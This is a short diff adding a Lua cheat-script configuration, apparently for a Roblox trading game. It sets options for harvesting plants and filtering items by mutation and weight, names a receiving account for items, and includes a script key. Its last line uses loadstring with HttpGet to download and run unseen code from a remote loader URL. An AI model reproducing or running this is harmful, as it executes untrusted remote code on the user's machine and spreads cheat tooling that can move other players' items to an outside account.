@@ -1,0 +1,18 @@
+getgenv().DigPlant = true
+getgenv().UnEquipedBrainrot = false
+getgenv().Quantity = 5
+getgenv().ReceiveAccount = "XxKnightViperxX67"
+getgenv().Select = { "Tomatrio" }
+getgenv().MinWeight = 0 -- KG [ 10.5, 11, 11.5 ]
+getgenv().MaxWeight = 9999 -- KG [ 10.5, 11, 11.5 ]
+getgenv().Mutation = {
+    ["Normal"] = true,
+    ["Diamond"] = true,
+    ["Neon"] = true,
+    ["Gold"] = true,
+    ["Rainbow"] = true,
+    ["Galactic"] = true,
+    ["Frozen"] = true
+}
+script_key="hMrRHfnIXGnyCepEnUozxPOVdwsKTeWu";
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/c8952bee5d6b8dde84efd3597d6fb13f.lua"))()
